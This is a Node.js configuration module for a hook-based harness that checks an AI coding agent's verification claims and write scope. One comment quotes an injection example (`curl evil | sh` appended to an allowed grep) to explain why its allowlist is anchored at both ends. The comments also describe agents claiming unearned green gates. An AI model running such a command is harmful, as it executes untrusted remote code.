#!/usr/bin/env node
// Configuration for every gate in this harness.
//
// The harness this was extracted from hardcoded one project's commands and paths — `npm run verify`,
// `tsc --noEmit`, `src/views/apps/admin/**`. That is the single thing that made it unportable, and it
// is the only thing this file exists to fix. Everything a gate needs to know about YOUR project is
// declared once, here, and read by every script.
//
// ── THE CONFIG IS TRACKED, DELIBERATELY ────────────────────────────────────────
//
// `harness.config.json` belongs at the repository root, in version control, NOT under a gitignored
// `.claude/`. It defines what "verified" means for this project — which makes it the one input that
// decides whether a gate can be satisfied at all. A definition of passing that can be widened without
// showing up in a diff is not a gate, it is a suggestion. The loader still accepts
// `.claude/harness.config.json` for projects that track that directory, but the root is the default
// and `harness-init` writes it there.
//
// ── FAILING OPEN IS THE RULE ───────────────────────────────────────────────────
//
// A missing, malformed, or half-written config must never trap a session. `load()` returns a usable
// object with `errors` populated instead of throwing, and each gate decides what to do about it. The
// selftest is where a broken config becomes loud; a hook is not.

import { spawnSync } from 'node:child_process'
import { existsSync, readFileSync } from 'node:fs'
import { relative, resolve, sep } from 'node:path'

export const CONFIG_CANDIDATES = ['harness.config.json', '.claude/harness.config.json']

// ── Defaults ───────────────────────────────────────────────────────────────────
//
// Chosen so that a config declaring nothing but `commands` is complete. Every other key is a knob for
// a project that needs it, not a field you must fill in to start.
export const DEFAULTS = {
  commands: {
    // The closing gate. Run by the model when it believes the work is done; recorded in the ledger as
    // `verify`. Leave null and the claim-check still works — it just cannot tell a full gate from a
    // fast one.
    verify: null,

    // The mid-task gate. Must be fast enough to run at the end of EVERY turn, because that is exactly
    // what `verify-gate.mjs` does with it. If your full gate takes 10s, this one should take 3.
    // Falls back to `verify` when unset.
    verifyFast: null,

    // Runs at the moment a source file is written, debounced. Must be FASTER than verifyFast — a
    // per-file typecheck, not the suite. Leave null and `gate-edit-check.mjs` never runs at all.
    editCheck: null
  },

  // How long `verify-gate.mjs` waits for `verifyFast` before giving up and standing aside. A gate
  // that hangs is worse than a gate that misses.
  verifyTimeoutMs: 120_000,

  // What counts as "source" for the purposes of "you edited source and verified nothing". Paths are
  // repo-relative and matched with the minimal glob below (`**` crosses separators, `*` does not).
  //
  // Edits to docs, plans, config, or scratch are deliberately NOT source: a turn that only touched
  // README.md did not break the build, and blocking it teaches the model that the gate is noise.
  source: {
    include: ['src/**', 'lib/**', 'app/**', 'pkg/**', 'internal/**', 'cmd/**', 'test/**', 'tests/**'],
    exclude: ['**/*.md', '**/*.txt', '**/*.lock', '**/__snapshots__/**']
  },

  evidence: {
    // Extra command→kind mappings, checked BEFORE the builtins. Use this when your verification
    // command is not something the builtin catalog would recognise.
    //   { "kind": "test", "match": "bazel test //..." }
    // `match` is a JavaScript regular expression source string, case-insensitive.
    patterns: [],

    // Set false to recognise ONLY your own patterns plus those derived from `commands`.
    useBuiltins: true
  },

  gates: {
    // Blocks the turn while `verifyFast` is red. Escalates on an UNCHANGED failure, halts on the third.
    verifyGate: { enabled: true, maxSameFailure: 3 },

    // Blocks a turn that edited source and verified nothing, or that claims a green gate no run supports.
    claimCheck: { enabled: true, maxBlocks: 2, extraClaimPatterns: [] },

    // Counts consecutive failures of the same shell command.
    loopBreaker: { enabled: true, injectAt: 2, blockAt: 3 },

    // Records that hooks fired and what their payloads carried. Never blocks anything.
    heartbeat: { enabled: true },

    // Runs `commands.editCheck` right after a source edit. Early warning, never the boundary: a skip
    // here can only DEFER a check, because verify-gate still runs on Stop and SubagentStop.
    //
    //   graceMs   wait, then stand down if a newer edit arrived — parallel tool calls in one message
    //             otherwise run this against a half-applied refactor
    //   windowMs  skip if the last run was GREEN and more recent than this. A RED result is never
    //             suppressed: a broken tree needs to know the moment it goes green
    //   paths     which files it applies to. Empty means "whatever `source` says is source"
    editCheck: { enabled: true, graceMs: 400, windowMs: 15_000, paths: [] }
  },

  // Agents that CANNOT repair a red tree, because they have no write access to source. Blocking them
  // demands a fix they are structurally incapable of making, and every block replays their entire
  // accumulated context. Names match the `name:` in an agent's frontmatter, which is what arrives on
  // the hook payload as `agent_type`.
  readOnlyAgents: ['tester', 'auditor', 'change-auditor', 'Explore'],

  agents: {
    // Per-agent write allowlists, enforced by `guard-write.mjs`.
    //
    // SCOPING LIVES IN THE SCRIPT, NOT IN AGENT FRONTMATTER. Per-subagent `hooks:` blocks are
    // documented as scoped to that subagent, and in the system this was extracted from they were
    // schema-valid and DID NOT FIRE — a tester wrote to source unblocked while settings.json hooks
    // fired normally in the same session. `agent_type` is on the payload, so the script can do the
    // scoping itself and be sure it happened.
    //
    // An agent not listed here is unrestricted. This holds specific agents to their stated role; it is
    // not a session lockdown.
    write: {
      architect: ['.claude/plans/**'],
      tester: ['.claude/plans/**', 'tests/**', 'test/**', '**/*.test.*', '**/*.spec.*', '**/__tests__/**']
    },

    // A single Write to a plan document larger than this is refused, so the architect writes a skeleton
    // and fills phases in with Edit.
    //
    // HONEST LIMIT: this cannot prevent the failure that motivated it. A generation that times out
    // before emitting the tool call is never seen by a PreToolUse hook, and a Write is atomic — a
    // timed-out one saves zero bytes, not a partial file. What it prevents is the monolithic write that
    // SUCCEEDS, which is how the habit survives.
    planWriteMaxLines: 600
  },

  plan: {
    dir: '.claude/plans',

    // Extra commands a step's `**Verify:**` line may execute, as both-end-anchored regex sources.
    // Your declared `commands` are allowed automatically, along with a small fixed safe set
    // (`test -f`, `grep`). See verify-plan.mjs for why the list is anchored at BOTH ends and why
    // there is no shell.
    allowedChecks: [],

    // Commands that MAY be run but can never exit 0 in this project — a suite with known-failing
    // tests, a check that trips on pre-existing drift. "May be executed" and "is a valid gate" are
    // different claims, and conflating them produces a phase that can never complete and a run that
    // halts naming work that was finished and correct.
    unsatisfiable: [],

    // Below this fraction of discriminating checks, `--strict` exits 2: the plan cannot tell you
    // whether work was done. Distinct from exit 1 ("a step failed") on purpose.
    strictThreshold: 0.5,

    // Above this fraction of WEAK checks in a single phase, the cursor reports low-confidence rather
    // than done. Per phase, not per plan: a strong plan carrying one all-grep phase averages out above
    // any plan-wide threshold, and the cursor walks straight through the phase nobody checked.
    weakPhaseThreshold: 0.66
  },

  lessons: {
    enabled: true,
    dir: '.claude/lessons',

    // The cap is the point. Past ~40 the index stops being scannable and injection stops being cheap,
    // so growth must be paid for by consolidating or pruning. Raising it is how a curated set becomes
    // a log.
    max: 40,
    maxBodyLines: 25
  },

  candidates: {
    enabled: true,

    // Raw incidents captured automatically and NEVER injected into context, so they are free. At this
    // count the selftest reports that a review is due.
    reviewAt: 15
  },

  taskLoop: {
    enabled: true,

    // Every number here should come from a measurement in YOUR project, not from these defaults.
    // Note what is absent: there is no token cap, because token usage is not reliably observable on
    // the hook payload. A cap you cannot measure is decoration.
    budget: { iterations: 8, runMs: 4 * 60 * 60 * 1000, iterationMs: 35 * 60 * 1000, spawns: 14 },

    // Iterations against one phase with no new step passing before halting. Three, because the repair
    // loop already gets three attempts at one failure — so a stuck phase has had nine chances.
    phaseStuckAt: 3,

    // The repair loop owns fixing a red tree; the driver is the backstop, so its ceiling is higher.
    redCeiling: 4,

    // Turns the driver waits for a plan to be bound before halting. A run with no plan has nothing for
    // the cursor to read, and a driver that releases forever is indistinguishable from one working.
    planlessCeiling: 3
  },

  // Entry conditions, checked before a task-loop run spends an iteration. See preflight.mjs for why
  // this is a gate rather than a line in a report.
  preflight: {
    enabled: true,

    // Both of these are free and on by default. `cleanTree` is ENTRY ONLY — by iteration two the loop
    // has been editing on purpose, so a dirty tree is the expected state rather than a fault.
    cleanTree: true,
    treeGreen: true,

    // Anything the work depends on being up. `${env:NAME}` resolves from the environment; a value that
    // resolves to nothing is reported as UNSET rather than unreachable, because those need different
    // fixes. Any HTTP response counts as reachable — a root that 404s is still listening.
    //   ["${env:API_BASE_URL}", "http://localhost:3000"]
    reachable: [],

    // Arbitrary commands that must exit 0 before the loop starts. A toolchain check, a migration
    // status, a license probe.
    commands: [],

    // Consecutive failures of the between-iteration checks before the run halts. One flaky response is
    // not evidence a dependency is down, and killing a four-hour run over a dropped connection is its
    // own failure. The counting lives in the run record; preflight.mjs itself has no memory.
    maxConsecutiveFailures: 2
  },

  // Everything the harness writes at runtime. One directory so it is trivial to gitignore or wipe.
  state: { dir: '.claude/.harness' }
}

// ── Builtin evidence catalog ───────────────────────────────────────────────────
//
// Commands whose exit code is evidence about the health of the tree. Order matters: the first match
// wins, so narrower patterns come first.
//
// This list is deliberately broad across ecosystems rather than deep in any one. A command it fails to
// recognise is recorded as nothing, which makes `claim-check` stricter than intended (it sees no run) —
// so when in doubt, add it to `evidence.patterns` in your config rather than hoping.
const RUN = String.raw`\b(npm|pnpm|yarn|bun)\s+run\s+(--silent\s+)?`

export const BUILTIN_EVIDENCE = [
  // Script runners come first and in a deliberate order, because script names nest: `verify:fast` must
  // be tested before `verify`, and `test:e2e` before `test`. `verify` carries a lookahead so it cannot
  // swallow its own colon-suffixed variants.
  { kind: 'verify:fast', match: `${RUN}verify:fast\\b` },
  { kind: 'verify', match: `${RUN}verify\\b(?!:)` },
  { kind: 'e2e', match: `${RUN}(test:)?e2e\\b|\\bplaywright\\s+test\\b|\\bcypress\\s+run\\b` },

  {
    kind: 'typecheck',
    match: `${RUN}(typecheck|type-check|tsc)\\b|\\btsc\\b[^|;&]*--noEmit|\\bmypy\\b|\\bpyright\\b|\\bgo\\s+vet\\b|\\bcargo\\s+check\\b`
  },
  {
    kind: 'lint',
    match: `${RUN}lint(:\\w+)?\\b|\\beslint\\b|\\bruff\\s+check\\b|\\bflake8\\b|\\bpylint\\b|\\bcargo\\s+clippy\\b|\\bgolangci-lint\\b|\\brubocop\\b`
  },
  {
    kind: 'test',
    // `npm test` is valid without `run`, which is why this one does not reuse RUN.
    match: String.raw`\b(npm|pnpm|yarn|bun)\s+(run\s+)?(--silent\s+)?test(:\w+)?\b|\bpytest\b|\bjest\b|\bvitest\b|\bgo\s+test\b|\bcargo\s+test\b|\bnode\s+--test\b|\bmvn\s+test\b|\bgradle\s+test\b|\brspec\b|\bphpunit\b|\bdotnet\s+test\b|\bctest\b`
  },
  { kind: 'check', match: `${RUN}check(:\\w+)?\\b|\\bmake\\s+check\\b` },
  {
    kind: 'build',
    match: `${RUN}build\\b|\\bcargo\\s+build\\b|\\bgo\\s+build\\b|\\bmake\\s+build\\b|\\bdotnet\\s+build\\b`
  }
]

// ── Minimal glob ───────────────────────────────────────────────────────────────
//
// `**` crosses directory separators, `*` does not. Enough to express "any test file under any module"
// without taking on a dependency — and a harness that a project must `npm install` to run is one more
// thing that can be broken by the project it is meant to be checking.
export const globToRegExp = pattern => {
  const escaped = pattern.replace(/[.+^${}()|[\]\\]/g, '\\$&')
  const body = escaped.replace(/\*\*|\*/g, match => (match === '**' ? '.*' : '[^/]*'))

  return new RegExp(`^${body}$`)
}

// Escapes a literal command into a regex that matches it as a whole word.
//
// The trailing lookahead is load-bearing. Without it a `verify` command of `npm run verify` also
// matches `npm run verify:fast`, and every fast mid-task check is recorded as the closing gate — which
// is precisely the distinction `claim-check` and any review gate depend on.
export const commandToRegExp = command => {
  const escaped = String(command).trim().replace(/[.*+?^${}()|[\]\\]/g, '\\$&').replace(/\s+/g, String.raw`\s+`)

  return `${escaped}(?=$|[\\s;&|)])`
}

const isPlainObject = value => Boolean(value) && typeof value === 'object' && !Array.isArray(value)

// Shallow-per-section merge. Deliberately not a deep merge: `source.include` given in a config REPLACES
// the default list rather than appending to it, because a user narrowing the definition of source must
// get the narrow definition they asked for.
const merge = (base, override) => {
  const out = { ...base }

  for (const [key, value] of Object.entries(override ?? {})) {
    if (value === undefined) continue
    out[key] = isPlainObject(value) && isPlainObject(base[key]) ? merge(base[key], value) : value
  }

  return out
}

export const findConfigPath = (root = process.cwd()) => {
  for (const candidate of CONFIG_CANDIDATES) {
    const absolute = resolve(root, candidate)

    if (existsSync(absolute)) return absolute
  }

  return null
}

// ── load() ─────────────────────────────────────────────────────────────────────
//
// Never throws. Returns `{ ...config, path, errors, warnings }` where `errors` is non-empty if
// something is wrong. Gates check `errors` and decide; most choose to stand aside, because a hook that
// blocks because its own config is broken punishes the wrong party.
export const load = (root = process.cwd()) => {
  const errors = []
  const warnings = []
  const path = findConfigPath(root)
  let raw = {}

  if (!path) {
    warnings.push(
      'No harness.config.json found. Running on defaults, which declare no verify command — ' +
        'the repair loop is inert until you add one. Run `harness-init` to generate a starter config.'
    )
  } else {
    try {
      raw = JSON.parse(readFileSync(path, 'utf8'))
    } catch (error) {
      errors.push(`${path} is not valid JSON: ${error.message}`)
      raw = {}
    }
  }

  const config = merge(DEFAULTS, raw)

  config.path = path
  config.root = root
  config.errors = errors
  config.warnings = warnings

  if (!config.commands.verify && !config.commands.verifyFast) {
    warnings.push('Neither commands.verify nor commands.verifyFast is set — verify-gate.mjs will stand aside.')
  }

  // `verifyFast` falling back to `verify` is the right default but a bad silence: a full gate on every
  // turn is slow enough that people disable the harness rather than diagnose it.
  if (!config.commands.verifyFast && config.commands.verify) {
    config.commands.verifyFast = config.commands.verify
    warnings.push(
      'commands.verifyFast is unset, falling back to commands.verify. This runs on EVERY turn — ' +
        'if it is slow, declare a faster subset.'
    )
  }

  config.evidencePatterns = buildEvidencePatterns(config, errors)
  config.statePaths = statePaths(config)
  config.checkAllowlist = buildCheckAllowlist(config, errors)
  config.unsatisfiableChecks = buildUnsatisfiable(config, errors)

  return config
}

// ── Evidence patterns ──────────────────────────────────────────────────────────
//
// Derived-from-commands first (so `make check` declared as `verify` is recognised as the closing gate),
// then the user's own, then the builtin catalog. First match wins.
export const buildEvidencePatterns = (config, errors = []) => {
  const patterns = []

  const push = (kind, source, origin) => {
    try {
      patterns.push({ kind, re: new RegExp(source, 'i'), source, origin })
    } catch (error) {
      errors.push(`evidence pattern for "${kind}" is not a valid regex (${origin}): ${error.message}`)
    }
  }

  // ── LONGEST COMMAND FIRST ────────────────────────────────────────────────────
  //
  // First match wins, so when one declared command CONTAINS another the longer one must be tested
  // first. This bites in both directions and neither is exotic:
  //
  //   npm run verify        is a prefix of  npm run verify:fast
  //   ruff check . && mypy .  is a prefix of  ruff check . && mypy . && pytest -q
  //
  // Get the order wrong and every run of the full gate is recorded as the fast one, which silently
  // removes the distinction between "still working" and "wrapping up" — the exact signal the review
  // gate keys on. Sorting by length is what makes this correct without special-casing either shape.
  const declared = Object.entries(config.commands ?? {})
    .filter(([, command]) => Boolean(command))
    .sort(([, a], [, b]) => String(b).length - String(a).length)

  for (const [name, command] of declared) {
    push(name === 'verifyFast' ? 'verify:fast' : name, commandToRegExp(command), `commands.${name}`)
  }

  for (const entry of config.evidence?.patterns ?? []) {
    if (!entry?.kind || !entry?.match) {
      errors.push(`evidence.patterns entry missing "kind" or "match": ${JSON.stringify(entry)}`)
      continue
    }

    push(entry.kind, entry.match, 'evidence.patterns')
  }

  if (config.evidence?.useBuiltins !== false) {
    for (const entry of BUILTIN_EVIDENCE) push(entry.kind, entry.match, 'builtin')
  }

  return patterns
}

// ── Classification: USE vs MENTION, for commands ───────────────────────────────
//
// `grep -rn "pytest" docs/` does not run the test suite, and `echo "remember to run npm test"` does not
// verify anything. Matching patterns against the raw command string treats both as evidence — which is
// how a turn that ran nothing gets credited with a green gate, the exact failure this harness exists to
// prevent, arriving through its own front door.
//
// So classification is scoped to the BINARY BEING INVOKED, per command segment, never to the raw string:
//
//   1. Quoted spans are removed first, so text inside an argument cannot be read as an invocation.
//   2. The command is split on `;`, `&&`, `||`, `|` and newlines into segments.
//   3. Any candidate whose first token is a text tool is dropped outright.
//   4. The FULL command is tried before its segments, so a multi-part verify command declared in
//      `commands` — `go build ./... && go vet ./...` — still matches as one unit.
const TEXT_TOOLS = new Set([
  'echo', 'printf', 'grep', 'rg', 'ag', 'ack', 'cat', 'bat', 'sed', 'awk', 'head', 'tail', 'less', 'more',
  'find', 'ls', 'wc', 'sort', 'uniq', 'diff', 'tee', 'comm', 'cut', 'tr', 'man', 'which', 'type'
])

const stripQuotedArgs = command => command.replace(/"[^"]*"/g, ' ').replace(/'[^']*'/g, ' ')

const firstToken = segment => segment.trim().replace(/^[A-Za-z_][\w]*=\S*\s+/g, '').split(/\s+/)[0]?.replace(/^.*\//, '') ?? ''

const isTextTool = candidate => TEXT_TOOLS.has(firstToken(candidate))

export const commandCandidates = command => {
  const cleaned = stripQuotedArgs(command)
  const segments = cleaned.split(/(?:&&|\|\||[;|\n])/g).map(segment => segment.trim()).filter(Boolean)

  return [cleaned.trim(), ...segments].filter(candidate => candidate && !isTextTool(candidate))
}

// Returns the ledger `kind` for a shell command, or null when the command is not evidence.
export const classifyCommand = (config, command) => {
  if (typeof command !== 'string' || !command.trim()) return null

  for (const candidate of commandCandidates(command)) {
    const match = config.evidencePatterns.find(pattern => pattern.re.test(candidate))

    if (match) return match.kind
  }

  return null
}

// ── Command runnability ────────────────────────────────────────────────────────
//
// The most expensive way this harness can be installed is with a declared command that CANNOT RUN.
// It is invisible at setup time: the config looks right, the selftest prints the command approvingly,
// every hook is registered correctly. Then `verifyFast` runs at the end of the FIRST turn, exits
// non-zero because the binary was never installed, and the gate blocks — on a failure that has nothing
// to do with the code that was just written, and will recur on every turn forever.
//
// Someone who cannot trace that back to a setup guess concludes the harness is broken and deletes it.
// So the guess gets checked at the moment it is made, rather than at the end of the first turn.
//
// ── RUNNABLE IS NOT PASSING ────────────────────────────────────────────────────
//
// A red tree is the healthy case this entire harness exists to surface, so a non-zero exit is NOT a
// finding here. The only thing being detected is "the shell could not find the thing to run". Those
// two are indistinguishable in an exit code and obvious in stderr, which is why this reads output
// rather than status alone.
// Every shell says this differently, so the list is per-shell rather than per-cause. macOS and Linux
// contribute the first two; Windows contributes the next three, because `shell: true` there runs
// cmd.exe while a Git Bash or WSL user is on sh and a PowerShell wrapper phrases it a third way.
export const NOT_RUNNABLE = [
  /command not found/i, // bash, zsh
  /:\s*not found/i, // dash, ash, Git Bash
  /\bis not recognized as\b/i, // cmd.exe "...an internal or external command", PowerShell "...the name of a cmdlet"
  /the system cannot find the (path|file) specified/i, // cmd.exe, bad path rather than bad name
  /is not recognized as a name of a cmdlet/i, // older PowerShell wording
  /\bmissing script\b/i, // npm run <script that is not in package.json>
  /no such file or directory/i,
  /can'?t open file/i, // python path/that/does/not/exist.py
  /no rule to make target/i,
  /unknown command/i // cargo/go/deno subcommand that does not exist
]

// 127 is the POSIX convention. 9009 is what cmd.exe returns for a name it could not resolve, and it is
// the only signal when the shell wrote nothing usable to either stream.
export const NOT_RUNNABLE_EXITS = new Set([127, 9009])

// Pure, so the decision is testable without spawning anything.
//
// A TIMEOUT COUNTS AS RUNNABLE, which is the move that makes this safe rather than a compromise that
// weakens it. Every failure above is decided in milliseconds — the shell either resolves the binary or
// it does not. A command still executing when the deadline passes has therefore already proved its
// binary exists, so a slow test suite can be probed with a short timeout and no false alarm.
export const classifyProbe = ({ status = null, stderr = '', stdout = '', timedOut = false } = {}) => {
  if (timedOut) return { runnable: true, verdict: 'slow' }

  // stdout as well as stderr: npm reports a missing script on stdout in some versions.
  const output = `${stderr}\n${stdout}`
  const matched = NOT_RUNNABLE.find(pattern => pattern.test(output))

  if (matched || NOT_RUNNABLE_EXITS.has(status)) {
    const line = output
      .split('\n')
      .map(text => text.trim())
      .find(text => matched?.test(text))

    return { runnable: false, verdict: 'missing', detail: line ?? `exited ${status} without running` }
  }

  return { runnable: true, verdict: status === 0 ? 'pass' : 'fail', status }
}

// `timeout` is deliberately short. See above: this is only ever distinguishing "found the binary" from
// "did not", and that question is always answered immediately.
export const probeCommand = (command, { cwd = process.cwd(), timeout = 15000 } = {}) => {
  if (typeof command !== 'string' || !command.trim()) return { runnable: true, verdict: 'unset' }

  // A command that runs the selftest would re-enter this probe from inside itself, forever. The docs
  // actively recommend wiring the selftest into `verify`, so this is an ordinary configuration rather
  // than a corner case, and it has to be refused by name.
  if (/selftest\.mjs/.test(command)) return { runnable: true, verdict: 'skipped' }

  let result

  try {
    result = spawnSync(command, { shell: true, cwd, timeout, encoding: 'utf8' })
  } catch (error) {
    return { runnable: false, verdict: 'missing', detail: error.message }
  }

  return classifyProbe({
    status: result.status,
    stderr: result.stderr ?? '',
    stdout: result.stdout ?? '',
    timedOut: result.error?.code === 'ETIMEDOUT' || Boolean(result.signal)
  })
}

// ── Source matching ────────────────────────────────────────────────────────────
//
// Answers "is this file the kind of thing a `tests pass` claim is about". Absolute paths are made
// repo-relative first; anything outside the repo is never source.
export const isSourceFile = (config, filePath, root = config.root ?? process.cwd()) => {
  if (typeof filePath !== 'string' || !filePath) return false

  const rel = relative(root, resolve(root, filePath)).split(sep).join('/')

  if (!rel || rel.startsWith('..')) return false

  const excluded = (config.source?.exclude ?? []).some(pattern => globToRegExp(pattern).test(rel))

  if (excluded) return false

  return (config.source?.include ?? []).some(pattern => globToRegExp(pattern).test(rel))
}

export const statePaths = config => {
  const dir = config.state?.dir ?? DEFAULTS.state.dir

  return {
    dir,
    ledger: `${dir}/ledger.jsonl`,
    verifyState: `${dir}/verify-state.json`,
    claimState: `${dir}/claim-state.json`,
    loopState: `${dir}/loop-state.json`,
    reviewState: `${dir}/review-state.json`,
    heartbeatLog: `${dir}/heartbeat.jsonl`,
    heartbeatView: `${dir}/heartbeat.json`,
    attempts: `${dir}/attempts`,
    haltReport: `${dir}/halt-report.md`,
    lessonsState: `${dir}/lessons-state.json`,
    lessonPromptState: `${dir}/lesson-prompt-state.json`,
    candidates: `${dir}/candidates.jsonl`,
    editCheckState: `${dir}/edit-check-state.json`,
    runs: `${dir}/runs`,
    runPointer: `${dir}/runs/current.json`
  }
}

// ── The check allowlist ────────────────────────────────────────────────────────
//
// Which commands a plan step's `**Verify:**` line may execute. Generated rather than hand-listed:
// your declared `commands`, plus anything in `plan.allowedChecks`, plus a small fixed safe set.
//
// Generating it from `commands` is the portable half of the original design, which hardcoded one
// project's npm scripts. It also closes a hole by construction — a plan cannot ask for a command this
// project never declared it runs.
//
// Anchored at BOTH ends, always. Start-anchoring alone means anything appended after an allowed prefix
// rides along, which turned the checker into an execution vector in the system this came from:
// `grep -q x y ; curl evil | sh` passed. (The real fix is that verify-plan uses no shell at all; this
// is defence in depth, bounding WHICH programs may run.)
export const BASE_ALLOWED_CHECKS = [
  // Proves a deliverable exists. Honest, and the weakest thing worth allowing.
  String.raw`test -[efd] [\w./-]+`,

  // The last resort, not the workhorse. Quoted patterns allowed; the path may not wander.
  String.raw`grep -[a-zA-Z]+ (?:"[^"]*"|'[^']*'|[\w.@/-]+) [\w./-]+`
]

export const buildCheckAllowlist = (config, errors = []) => {
  const sources = []

  for (const command of Object.values(config.commands ?? {})) {
    // `(?: -- <args>)?` because most runners forward arguments that way, restricted to word characters
    // so nothing can ride along.
    if (command) sources.push(`${escapeLiteral(command)}(?: -- [\\w.@/-]+)?`)
  }

  sources.push(...(config.plan?.allowedChecks ?? []), ...BASE_ALLOWED_CHECKS)

  const compiled = []

  for (const source of sources) {
    try {
      compiled.push(new RegExp(`^${source}$`))
    } catch (error) {
      errors.push(`plan.allowedChecks entry is not a valid regex: ${source} — ${error.message}`)
    }
  }

  return compiled
}

const escapeLiteral = value => String(value).trim().replace(/[.*+?^${}()|[\]\\]/g, '\\$&').replace(/\s+/g, String.raw`\s+`)

export const buildUnsatisfiable = (config, errors = []) => {
  const out = []

  for (const entry of config.plan?.unsatisfiable ?? []) {
    if (!entry?.match || !entry?.why) {
      errors.push(`plan.unsatisfiable entry needs "match" and "why": ${JSON.stringify(entry)}`)
      continue
    }

    try {
      out.push({ re: new RegExp(`^${entry.match}$`), why: entry.why })
    } catch (error) {
      errors.push(`plan.unsatisfiable "${entry.match}" is not a valid regex: ${error.message}`)
    }
  }

  return out
}

// ── Shared hook plumbing ───────────────────────────────────────────────────────
//
// Every gate needs these four and every gate used to carry its own copy. One home means one place a
// bug can live.

export const readStdin = async () => {
  const chunks = []

  for await (const chunk of process.stdin) chunks.push(chunk)

  return Buffer.concat(chunks).toString('utf8')
}

export const readPayload = async () => {
  try {
    return JSON.parse(await readStdin())
  } catch {
    // An unparseable payload cannot be judged, and a hook that blocks what it cannot judge blocks
    // everything. Callers treat null as "stand aside".
    return null
  }
}

export const block = reason => {
  process.stdout.write(`${JSON.stringify({ decision: 'block', reason })}\n`)
  process.exit(0)
}

export const inject = (reason, hookEventName = 'PostToolUse') => {
  process.stdout.write(`${JSON.stringify({ hookSpecificOutput: { hookEventName, additionalContext: reason } })}\n`)
}

export const deny = reason => {
  process.stdout.write(
    `${JSON.stringify({
      hookSpecificOutput: { hookEventName: 'PreToolUse', permissionDecision: 'deny', permissionDecisionReason: reason }
    })}\n`
  )
  process.exit(0)
}

// ── Failure detection ──────────────────────────────────────────────────────────
//
// POSITIVE EVIDENCE ONLY. When the payload shape is unrecognised this returns false — "not a failure" —
// rather than inventing one. A breaker that fires spuriously gets switched off, and then it protects
// nothing; a breaker that occasionally misses is merely less useful.
//
// The field list is a probe, not a schema. Hook payload shapes are not guaranteed stable across
// versions, so this checks every plausible name rather than asserting one.
export const didFail = payload => {
  if (payload?.hook_event_name === 'PostToolUseFailure') return true

  const response = payload?.tool_response

  if (!response || typeof response !== 'object') return false

  for (const field of ['exit_code', 'exitCode', 'code', 'status', 'returnCode']) {
    if (typeof response[field] === 'number') return response[field] !== 0
  }

  for (const field of ['is_error', 'isError', 'error', 'failed']) {
    if (typeof response[field] === 'boolean') return response[field]
  }

  return false
}

// The turn identifier. `prompt_id` is a real boundary; `session_id` is the fallback and is coarser.
export const turnKey = payload => payload?.prompt_id ?? payload?.session_id ?? 'unknown'

// Scope for per-run counters: distinct per agent, so a subagent's repair loop never inherits the main
// thread's count.
export const scopeKey = payload => `${payload?.session_id ?? 'unknown'}:${payload?.agent_id ?? 'main'}`
